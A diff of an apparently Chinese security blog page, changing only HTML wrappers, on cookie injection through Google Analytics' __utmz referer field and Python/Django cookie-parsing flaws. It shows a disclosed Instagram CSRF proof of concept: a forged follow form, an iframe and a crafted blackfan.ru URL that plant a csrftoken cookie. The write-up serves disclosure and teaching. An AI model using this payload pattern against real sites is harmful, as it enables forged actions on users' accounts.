@@ -73,14 +73,12 @@
   <li>Google Analytics 会设置这样的 Cookie 来追踪用户访问</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]
+</code></pre></div></div>
 <p>比如</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/path/
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/path/
+</code></pre></div></div>
 
 <ul>
   <li>用户可以完全控制 referer 中的 path，然后在放入<code class="highlighter-rouge">__utmz</code>的时候没有过滤</li>
@@ -93,10 +91,9 @@
   <li>但是很多 web server 也可以接收使用逗号分隔的</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>Cookie: param1=value2, param2=value2
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cookie: param1=value2, param2=value2
 Cookie: param1=value2,param2=value2
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Python 和 Django 使用了不正确的正则表达式来 parse Cookie，导致用户也可以使用<code class="highlighter-rouge">[]</code>来作为分隔符 <code class="highlighter-rouge">Cookie: param1=value1]param2=value2</code></p>
 
@@ -111,13 +108,12 @@ Cookie: param1=value2,param2=value2
 
 <p>例子</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code> <span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">http</span> <span class="kn">import</span> <span class="n">cookies</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">http</span> <span class="kn">import</span> <span class="n">cookies</span>
  <span class="o">&gt;&gt;&gt;</span> <span class="n">C</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">.</span><span class="n">SimpleCookie</span><span class="p">()</span>
  <span class="o">&gt;&gt;&gt;</span> <span class="n">C</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s">'__utmz=blah]csrftoken=x'</span><span class="p">)</span>
  <span class="o">&gt;&gt;&gt;</span> <span class="n">C</span>
  <span class="o">&lt;</span><span class="n">SimpleCookie</span><span class="p">:</span> <span class="n">csrftoken</span><span class="o">=</span><span class="s">'x'</span><span class="o">&gt;</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h2 id="不同的浏览器对-cookie-处理结果的不同">不同的浏览器对 Cookie 处理结果的不同</h2>
 
@@ -125,9 +121,8 @@ Cookie: param1=value2,param2=value2
 
 <p>而且 Chrome 只可以处理有限的 Cookie 属性，比如</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>Set-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=blah.blah.blah.google.com;
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=blah.blah.blah.google.com;
+</code></pre></div></div>
 
 <p>最终只能给<code class="highlighter-rouge">.google.com</code>而不是<code class="highlighter-rouge">blah.blah.blah.google.com</code>设置上 Cookie</p>
 
@@ -161,7 +156,7 @@ Cookie: param1=value2,param2=value2
 
 <p><code class="highlighter-rouge">http://blackfan.ru/facebookbugbounty/nouysqaqfbskgobuqkknoitvyqmjgony_instagram.html</code>的源码是</p>
 
-<div class="language-html highlighter-rouge"><pre class="highlight"><code><span class="nt">&lt;form</span> 
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> 
 <span class="na">action=</span><span class="s">"http://instagram.com/web/friendships/1312928755/follow/?ref=emptyfeed"</span> 
 <span class="na">id=</span><span class="s">"csrf"</span> 
 <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
@@ -176,8 +171,7 @@ Cookie: param1=value2,param2=value2
 <span class="nt">&lt;iframe</span> 
 <span class="na">onload=</span><span class="s">"xxx()"</span> 
 <span class="na">src=</span><span class="s">"http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/"</span><span class="nt">/&gt;</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="描述">描述</h3>
 
@@ -186,9 +180,8 @@ Cookie: param1=value2,param2=value2
   <li>让用户访问下面的链接，同时假设他没有访问过<code class="highlighter-rouge">blog.instagram.com</code>，也没有这个子域名的<code class="highlighter-rouge">__utmz</code>。</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/
+</code></pre></div></div>
 
 <p>这时候，Cookie 就会使用新的 path 和 domain，<code class="highlighter-rouge">.instgram.com</code> 就会被设置一个新的 Cookie <code class="highlighter-rouge">_utmz=90378079.1401435337.1.1.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/r/,]csrftoken=x</code></p>
 
@@ -201,13 +194,12 @@ Cookie: param1=value2,param2=value2
 
 <p>Python 的 patch 是 https://hg.python.org/cpython/rev/270f61ec1157，但是后来发现还是有问题的，比如</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">C</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">.</span><span class="n">SimpleCookie</span><span class="p">()</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">.</span><span class="n">SimpleCookie</span><span class="p">()</span>
 <span class="n">C</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s">'__utmz=blah csrftoken=x'</span><span class="p">)</span>
 <span class="n">C</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s">'__utmz=blah</span><span class="se">\x09</span><span class="s">csrftoken=x'</span><span class="p">)</span>
 <span class="n">C</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s">'__utmz=blah</span><span class="se">\x0b</span><span class="s">csrftoken=x'</span><span class="p">)</span>
 <span class="n">C</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s">'__utmz=blah</span><span class="se">\x0c</span><span class="s">csrftoken=x'</span><span class="p">)</span> 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>仍然会被解析为两个 Cookie，但是实际的浏览器处理并不一样</p>
 
